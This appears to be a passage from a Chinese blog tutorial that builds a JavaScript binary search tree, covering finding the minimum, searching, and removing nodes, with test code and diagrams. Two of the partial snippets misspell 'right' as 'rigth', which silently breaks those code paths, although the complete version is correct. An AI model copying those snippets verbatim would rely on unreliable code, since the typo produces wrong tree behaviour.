= <span class="built_in">this</span>.root</span><br><span class="line">  <span class="comment">//2.定义key保存节点值</span></span><br><span class="line">  <span class="keyword">let</span> key = <span class="literal">null</span></span><br><span class="line">  <span class="comment">//3.依次向左不断查找，直到节点为null</span></span><br><span class="line">  <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">    key = node.key</span><br><span class="line">    node = node.left</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"> <span class="comment">//1.创建BinarySearchTree</span></span><br><span class="line"> <span class="keyword">let</span> bst = <span class="keyword">new</span> BinarySearchTree()</span><br><span class="line"></span><br><span class="line"> <span class="comment">//2.插入数据</span></span><br><span class="line"> bst.insert(<span class="number">11</span>);</span><br><span class="line"> bst.insert(<span class="number">7</span>);</span><br><span class="line"> bst.insert(<span class="number">15</span>);</span><br><span class="line"> bst.insert(<span class="number">5</span>);</span><br><span class="line"> bst.insert(<span class="number">3</span>);</span><br><span class="line"> bst.insert(<span class="number">9</span>);</span><br><span class="line"> bst.insert(<span class="number">8</span>);</span><br><span class="line"> bst.insert(<span class="number">10</span>);</span><br><span class="line"> bst.insert(<span class="number">13</span>);</span><br><span class="line"> bst.insert(<span class="number">12</span>);</span><br><span class="line"> bst.insert(<span class="number">14</span>);</span><br><span class="line"> bst.insert(<span class="number">20</span>);</span><br><span class="line"> bst.insert(<span class="number">18</span>);</span><br><span class="line"> bst.insert(<span class="number">25</span>);</span><br><span class="line"> bst.insert(<span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//4.测试最值</span></span><br><span class="line"> <span class="built_in">console</span>.log(bst.max());</span><br><span class="line"> <span class="built_in">console</span>.log(bst.min());</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/17.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/17.png" alt="image-20200302133028801"></a></p><h5 id="3-2-查找特定值"><a href="#3-2-查找特定值" class="headerlink" title="3.2.查找特定值"></a>3.2.查找特定值</h5><p>查找二叉搜索树当中的特定值效率也非常高。只需要从根节点开始将需要查找节点的key值与之比较，若<strong>node.key &lt; root**则向左查找，若**node.key &gt; root</strong>就向右查找，直到找到或查找到null为止。这里可以使用递归实现，也可以采用循环来实现。</p><p><strong>实现代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查找特定的key</span></span><br><span class="line"> BinarySearchTree.prototype.search = <span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</span><br><span class="line">   <span class="comment">//1.获取根节点</span></span><br><span class="line">   <span class="keyword">let</span> node = <span class="built_in">this</span>.root</span><br><span class="line"></span><br><span class="line">   <span class="comment">//2.循环搜索key</span></span><br><span class="line">   <span class="keyword">while</span>(node != <span class="literal">null</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span> (key &lt; node.key) &#123;</span><br><span class="line">       <span class="comment">//小于根(父)节点就往左边找</span></span><br><span class="line">       node = node.left</span><br><span class="line">       <span class="comment">//大于根(父)节点就往右边找</span></span><br><span class="line">     &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key &gt; node.key)&#123;</span><br><span class="line">       node = node.right</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="comment">//1.创建BinarySearchTree</span></span><br><span class="line"><span class="keyword">let</span> bst = <span class="keyword">new</span> BinarySearchTree()</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.插入数据</span></span><br><span class="line">bst.insert(<span class="number">11</span>);</span><br><span class="line">bst.insert(<span class="number">7</span>);</span><br><span class="line">bst.insert(<span class="number">15</span>);</span><br><span class="line">bst.insert(<span class="number">5</span>);</span><br><span class="line">bst.insert(<span class="number">3</span>);</span><br><span class="line">bst.insert(<span class="number">9</span>);</span><br><span class="line">bst.insert(<span class="number">8</span>);</span><br><span class="line">bst.insert(<span class="number">10</span>);</span><br><span class="line">bst.insert(<span class="number">13</span>);</span><br><span class="line">bst.insert(<span class="number">12</span>);</span><br><span class="line">bst.insert(<span class="number">14</span>);</span><br><span class="line">bst.insert(<span class="number">20</span>);</span><br><span class="line">bst.insert(<span class="number">18</span>);</span><br><span class="line">bst.insert(<span class="number">25</span>);</span><br><span class="line">bst.insert(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.测试搜索方法</span></span><br><span class="line"><span class="built_in">console</span>.log(bst.search(<span class="number">24</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(bst.search(<span class="number">13</span>));<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(bst.search(<span class="number">2</span>));<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/18.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/18.png" alt="image-20200302141031370"></a></p><h4 id="4-删除数据"><a href="#4-删除数据" class="headerlink" title="4.删除数据"></a>4.删除数据</h4><p><strong>实现思路：</strong></p><p><strong>第一步：</strong>先找到需要删除的节点，若没找到，则不需要删除；</p><p>首先定义变量current用于保存需要删除的节点、变量parent用于保存它的父节点、变量isLeftChild保存current是否为parent的左节点，这样方便之后删除节点时改变相关节点的指向。</p><p><strong>实现代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.1.定义变量</span></span><br><span class="line">     <span class="keyword">let</span> current = <span class="built_in">this</span>.root</span><br><span class="line">     <span class="keyword">let</span> parent = <span class="literal">null</span></span><br><span class="line">     <span class="keyword">let</span> isLeftChild = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">//1.2.开始寻找删除的节点</span></span><br><span class="line">     <span class="keyword">while</span> (current.key != key) &#123;</span><br><span class="line">       parent = current</span><br><span class="line">       <span class="comment">// 小于则往左查找</span></span><br><span class="line">       <span class="keyword">if</span> (key &lt; current.key) &#123;</span><br><span class="line">         isLeftChild = <span class="literal">true</span></span><br><span class="line">         current = current.left</span><br><span class="line">       &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">         isLeftChild = <span class="literal">false</span></span><br><span class="line">         current = current.rigth</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//找到最后依然没有找到相等的节点</span></span><br><span class="line">       <span class="keyword">if</span> (current == <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//结束while循环后：current.key = key</span></span><br></pre></td></tr></table></figure><p><strong>第二步：</strong>删除找到的指定节点，后分3种情况：</p><ul><li>删除叶子节点；</li><li>删除只有一个子节点的节点；</li><li>删除有两个子节点的节点；</li></ul><h5 id="4-1-情况1：没有子节点"><a href="#4-1-情况1：没有子节点" class="headerlink" title="4.1.情况1：没有子节点"></a>4.1.情况1：没有子节点</h5><p>没有子节点时也有两种情况：</p><p>当该叶子节点为根节点时，如下图所示，此时<strong>current == this.root</strong>，直接通过：<strong>this.root = null</strong>，删除根节点。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/19.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/19.png" alt="image-20200302154316749"></a></p><p>当该叶子节点不为根节点时也有两种情况，如下图所示：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/20.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/20.png" alt="image-20200302154019653"></a></p><p>若current = 8，可以通过：parent.left = null，删除节点8；</p><p>若current = 10，可以通过：parent.right = null，删除节点10；</p><p><strong>代码实现：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;情况1：删除的是叶子节点(没有子节点)</span><br><span class="line">if (current.left &#x3D;&#x3D; null &amp;&amp; current.right &#x3D;&#x3D;null) &#123;</span><br><span class="line">  if (current &#x3D;&#x3D; this.root) &#123;</span><br><span class="line">    this.root &#x3D; null</span><br><span class="line">  &#125;else if(isLeftChild)&#123;</span><br><span class="line">    parent.left &#x3D; null</span><br><span class="line">  &#125;else &#123;</span><br><span class="line">    parent.right &#x3D;null</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-2-情况2：有一个子节点"><a href="#4-2-情况2：有一个子节点" class="headerlink" title="4.2.情况2：有一个子节点"></a>4.2.情况2：有一个子节点</h5><p>有六种情况分别是：</p><p>当current存在左子节点时（current.right == null）：</p><ul><li>情况1：current为根节点（current == this.root），如节点11，此时通过：this.root = current.left，删除根节点11；</li><li>情况2：current为父节点parent的左子节点（isLeftChild == true），如节点5，此时通过：parent.left = current.left，删除节点5；</li><li>情况3：current为父节点parent的右子节点（isLeftChild == false），如节点9，此时通过：parent.right = current.left，删除节点9；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/21.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/21.png" alt="image-20200302172806401"></a></p><p>当current存在右子节点时（current.left = null）：</p><ul><li>情况4：current为根节点（current == this.root），如节点11，此时通过：this.root = current.right，删除根节点11。</li><li>情况5：current为父节点parent的左子节点（isLeftChild == true），如节点5，此时通过：parent.left = current.right，删除节点5；</li><li>情况6：current为父节点parent的右子节点（isLeftChild == false），如节点9，此时通过：parent.right = current.right，删除节点9；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/22.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/22.png" alt="image-20200302172527722"></a></p><p><strong>实现代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//情况2：删除的节点有一个子节点</span></span><br><span class="line">  <span class="comment">//当current存在左子节点时</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(current.right == <span class="literal">null</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (current == <span class="built_in">this</span>.root) &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = current.left</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(isLeftChild) &#123;</span><br><span class="line">          parent.left = current.left</span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">          parent.right = current.left</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="comment">//当current存在右子节点时</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(current.left == <span class="literal">null</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (current == <span class="built_in">this</span>.root) &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = current.rigth</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(isLeftChild) &#123;</span><br><span class="line">          parent.left = current.right</span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">          parent.right = current.right</span><br><span class="line">      &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-3-情况3：有两个子节点"><a href="#4-3-情况3：有两个子节点" class="headerlink" title="4.3.情况3：有两个子节点"></a>4.3.情况3：有两个子节点</h5><p>这种情况<strong>十分复杂</strong>，首先依据以下二叉搜索树，讨论这样的问题：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/23.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/23.png" alt="image-20200302181849832"></a></p><p><strong>删除节点9</strong></p><p>在保证删除节点9后原二叉树仍为二叉搜索树的前提下，有两种方式：</p><ul><li>方式1：从节点9的左子树中选择一合适的节点替代节点9，可知节点8符合要求；</li><li>方式2：从节点9的右子树中选择一合适的节点替代节点9，可知节点10符合要求；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/24.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/24.png" alt="image-20200302190601622"></a></p><p><strong>删除节点7</strong></p><p>在保证删除节点7后原二叉树仍为二叉搜索树的前提下，也有两种方式：</p><ul><li>方式1：从节点7的左子树中选择一合适的节点替代节点7，可知节点5符合要求；</li><li>方式2：从节点7的右子树中选择一合适的节点替代节点7，可知节点8符合要求；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/25.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/25.png" alt="image-20200302183058326"></a></p><p><strong>删除节点15</strong></p><p>在保证删除节点15后原树二叉树仍为二叉搜索树的前提下，同样有两种方式：</p><ul><li>方式1：从节点15的左子树中选择一合适的节点替代节点15，可知节点14符合要求；</li><li>方式2：从节点15的右子树中选择一合适的节点替代节点15，可知节点18符合要求；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/26.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/26.png" alt="image-20200302184038470"></a></p><p>相信你已经发现其中的规律了！</p><p><strong>规律总结：</strong>如果要删除的节点有两个子节点，甚至子节点还有子节点，这种情况下需要从要删除节点<strong>下面的子节点中找到一个合适的节点</strong>，来替换当前的节点。</p><p>若用current表示需要删除的节点，则合适的节点指的是：</p><ul><li>current左子树中比current<strong>小一点点的节点</strong>，即current<strong>左子树</strong>中的<strong>最大值</strong>；</li><li>current右子树中比current<strong>大一点点的节点</strong>，即current<strong>右子树</strong>中的<strong>最小值</strong>；</li></ul><p><strong>前驱&amp;后继</strong></p><p>在二叉搜索树中，这两个特殊的节点有特殊的名字：</p><ul><li>比current小一点点的节点，称为current节点的<strong>前驱</strong>。比如下图中的节点5就是节点7的前驱；</li><li>比current大一点点的节点，称为current节点的<strong>后继</strong>。比如下图中的节点8就是节点7的后继；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/27.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/27.png" alt="image-20200302210841453"></a></p><p><strong>代码实现：</strong></p><ul><li>查找需要被删除的节点current的后继时，需要在current的<strong>右子树</strong>中查找<strong>最小值</strong>，即在current的<strong>右子树</strong>中一直<strong>向左遍历</strong>查找；</li><li>查找前驱时，则需要在current的<strong>左子树</strong>中查找<strong>最大值</strong>，即在current的<strong>左子树</strong>中一直<strong>向右</strong>遍历查找。</li></ul><p>下面只讨论查找current后继的情况，查找前驱的原理相同，这里暂不讨论。</p><h5 id="4-4-完整实现"><a href="#4-4-完整实现" class="headerlink" title="4.4.完整实现"></a>4.4.完整实现</h5><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">//删除节点</span></span><br><span class="line">      BinarySearchTree.prototype.remove = function(key)&#123;</span><br><span class="line"><span class="comment">/*------------------------------1.寻找要删除的节点---------------------------------*/</span></span><br><span class="line">        <span class="comment">//1.1.定义变量current保存删除的节点，parent保存它的父节点。isLeftChild保存current是否为parent的左节点</span></span><br><span class="line">        let current = <span class="keyword">this</span>.root</span><br><span class="line">        let parent = <span class="literal">null</span></span><br><span class="line">        let isLeftChild = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.2.开始寻找删除的节点</span></span><br><span class="line">        <span class="keyword">while</span> (current.key != key) &#123;</span><br><span class="line">          parent = current</span><br><span class="line">          <span class="comment">// 小于则往左查找</span></span><br><span class="line">          <span class="keyword">if</span> (key &lt; current.key) &#123;</span><br><span class="line">            isLeftChild = <span class="literal">true</span></span><br><span class="line">            current = current.left</span><br><span class="line">          &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            isLeftChild = <span class="literal">false</span></span><br><span class="line">            current = current.right</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//找到最后依然没有找到相等的节点</span></span><br><span class="line">          <span class="keyword">if</span> (current == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//结束while循环后：current.key = key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*------------------------------2.根据对应情况删除节点------------------------------*/</span></span><br><span class="line">        <span class="comment">//情况1：删除的是叶子节点(没有子节点)</span></span><br><span class="line">        <span class="keyword">if</span> (current.left == <span class="literal">null</span> &amp;&amp; current.right ==<span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (current == <span class="keyword">this</span>.root) &#123;</span><br><span class="line">            <span class="keyword">this</span>.root = <span class="literal">null</span></span><br><span class="line">          &#125;<span class="keyword">else</span> <span class="keyword">if</span>(isLeftChild)&#123;</span><br><span class="line">            parent.left = <span class="literal">null</span></span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            parent.right =<span class="literal">null</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//情况2：删除的节点有一个子节点</span></span><br><span class="line">        <span class="comment">//当current存在左子节点时</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(current.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (current == <span class="keyword">this</span>.root) &#123;</span><br><span class="line">              <span class="keyword">this</span>.root = current.left</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(isLeftChild) &#123;</span><br><span class="line">                parent.left = current.left</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                parent.right = current.left</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//当current存在右子节点时</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(current.left == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (current == <span class="keyword">this</span>.root) &#123;</span><br><span class="line">              <span class="keyword">this</span>.root = current.right</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(isLeftChild) &#123;</span><br><span class="line">                parent.left = current.right</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                parent.right = current.right</span><br><span class="line">            &#125; </span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">//情况3：删除的节点有两个子节点</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="comment">//1.获取后继节点</span></span><br><span class="line">          let successor = <span class="keyword">this</span>.getSuccessor(current)</span><br><span class="line"></span><br><span class="line">          <span class="comment">//2.判断是否根节点</span></span><br><span class="line">          <span class="keyword">if</span> (current == <span class="keyword">this</span>.root) &#123;</span><br><span class="line">            <span class="keyword">this</span>.root = successor</span><br><span class="line">          &#125;<span class="keyword">else</span> <span class="keyword">if</span> (isLeftChild)&#123;</span><br><span class="line">            parent.left = successor</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            parent.right = successor</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//3.将后继的左子节点改为被删除节点的左子节点</span></span><br><span class="line">          successor.left = current.left</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//封装查找后继的方法</span></span><br><span class="line">      BinarySearchTree.prototype.getSuccessor = function(delNode)&#123;</span><br><span class="line">        <span class="comment">//1.定义变量,保存找到的后继</span></span><br><span class="line">        let successor = delNode</span><br><span class="line">        let current = delNode.right</span><br><span class="line">        let successorParent = delNode</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.循环查找current的右子树节点</span></span><br><span class="line">        <span class="keyword">while</span>(current != <span class="literal">null</span>)&#123;</span><br><span class="line">          successorParent = successor</span><br><span class="line">          successor = current</span><br><span class="line">          current = current.left</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.判断寻找到的后继节点是否直接就是删除节点的right节点</span></span><br><span class="line">        <span class="keyword">if</span>(successor != delNode.right)&#123;</span><br><span class="line">          successorParent.left = successor.right</span><br><span class="line">          successor.right = delNode.right </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> successor</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 